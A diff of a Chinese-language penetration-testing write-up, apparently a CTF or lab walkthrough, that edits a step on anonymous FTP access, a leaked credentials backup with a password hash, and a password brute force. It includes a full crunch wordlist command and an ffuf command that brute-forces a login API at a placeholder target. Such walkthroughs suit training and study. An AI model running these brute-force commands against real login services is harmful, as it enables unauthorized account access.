@@ -18,7 +18,7 @@
 *   **FTP 滲透**：
     *   從 `/changelog` 發現匿名 FTP 服務的存在。
     *   在 FTP 的 `/backup_logs/` 目錄下載 `credentials.bak`。
-    *   **憑證爆破**：發現 `guest` 帳號資訊與模式提示 `[username][digits]`，以及建議使用的 `ffuf` 指令。
+    *   **憑證發現**：在 FTP 的 `/backup_logs/` 目錄下載 `credentials.bak`。發現 `guest` 的雜湊值 `FCF41657F02F88137A1BCF068A32C0A3`、模式提示 `[username][digits]`，以及建議使用的 `ffuf` 指令。
     *   利用 `crunch` 產生自定義字典：`crunch 8 10 -t guest%%% -o wordlist.txt`
     *   使用 `ffuf` 進行爆破得到密碼：`guest123`。
         `ffuf -w wordlist.txt -u http://<TARGET_IP>:8080/api/login -X POST -H "Content-Type: application/json" -d '{"username":"guest","password":"FUZZ"}' -fr "帳號或密碼錯誤"`
